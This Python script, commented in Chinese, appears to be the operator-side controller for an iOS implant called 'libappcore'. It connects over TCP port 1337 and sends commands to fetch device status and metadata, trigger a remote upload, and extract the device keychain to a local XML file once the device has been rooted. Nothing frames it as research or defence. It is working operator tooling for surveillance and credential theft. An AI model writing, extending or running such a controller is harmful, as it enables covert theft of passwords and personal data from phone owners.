#!/usr/bin/env python3
"""
example_controller_usage.py - 电脑端控制器使用示例
演示如何通过 TCP 协议与设备端 libappcore 交互
"""
import socket
import json
import sys

DEVICE_IP = "192.168.1.100"  # 替换为设备 IP
DEVICE_PORT = 1337


def send_command(ip, port, command, args=None):
    """向设备发送命令并接收响应"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((ip, port))

        # 发送命令
        sock.sendall(f"{command}\n".encode())
        if args:
            sock.sendall(f"{args}\n".encode())

        # 接收响应
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break

        sock.close()
        return data
    except Exception as e:
        print(f"连接失败: {e}")
        return None


def example_get_version():
    """获取 Agent 版本"""
    print("[1] 获取版本...")
    data = send_command(DEVICE_IP, DEVICE_PORT, "version")
    if data:
        print(f"  版本: {data.decode('utf-8', errors='replace').strip()}")


def example_get_status():
    """获取设备状态"""
    print("\n[2] 获取状态...")
    data = send_command(DEVICE_IP, DEVICE_PORT, "status")
    if data:
        try:
            status = json.loads(data.decode('utf-8'))
            print(f"  状态: {json.dumps(status, indent=2)}")
        except:
            print(f"  原始数据: {data[:200]}")


def example_get_metadata():
    """获取设备元数据"""
    print("\n[3] 获取元数据...")
    data = send_command(DEVICE_IP, DEVICE_PORT, "metadata")
    if data:
        try:
            meta = json.loads(data.decode('utf-8'))
            print(f"  设备: {meta.get('device_name', '?')}")
            print(f"  型号: {meta.get('device_type', '?')}")
            print(f"  iOS: {meta.get('ios_version', '?')}")
        except:
            print(f"  数据长度: {len(data)} 字节")


def example_trigger_upload():
    """触发远程上传"""
    print("\n[4] 触发上传...")
    data = send_command(DEVICE_IP, DEVICE_PORT, "upload", "metadata")
    if data:
        print(f"  响应: {data.decode('utf-8', errors='replace').strip()}")


def example_extract_keychain():
    """提取钥匙串 (需要提权)"""
    print("\n[5] 提取钥匙串 (需root)...")
    data = send_command(DEVICE_IP, DEVICE_PORT, "keychain")
    if data:
        print(f"  钥匙串数据: {len(data)} 字节")
        # 保存到文件
        with open("keychain_export.xml", "wb") as f:
            f.write(data)
        print("  已保存到 keychain_export.xml")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        DEVICE_IP = sys.argv[1]

    print(f"=== libappcore 控制器示例 (连接 {DEVICE_IP}:{DEVICE_PORT}) ===\n")

    example_get_version()
    example_get_status()
    example_get_metadata()
    example_trigger_upload()
    # example_extract_keychain()  # 需要设备已提权

    print("\n完成!")
